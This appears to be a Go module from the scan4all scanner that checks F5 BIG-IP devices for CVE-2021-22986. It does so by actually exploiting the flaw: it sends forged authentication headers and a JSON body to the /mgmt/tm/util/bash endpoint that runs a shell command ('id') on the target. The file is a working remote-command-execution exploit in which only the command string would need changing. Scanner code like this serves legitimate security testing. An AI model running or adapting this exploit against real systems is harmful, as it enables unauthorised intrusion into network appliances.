package f5

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func CVE_2021_22986(u string) bool {
	header := make(map[string]string)
	header["Authorization"] = "Basic YWRtaW46MQ=="
	header["Connection"] = "close"
	header["X-F5-Auth-Token"] = ""
	header["X-Forwarded-For"] = "localhost"
	header["Content-Type"] = "application/json"
	header["Referer"] = "localhost"
	data := "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
	if req, err := util.HttpRequset(u+"/mgmt/tm/util/bash", "POST", data, false, header); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "commandResult") {
			util.SendLog(req.RequestUrl, "CVE-2021-22986", "Found  F5 BIG-IP ", data)
			return true
		}
	}
	return false
}
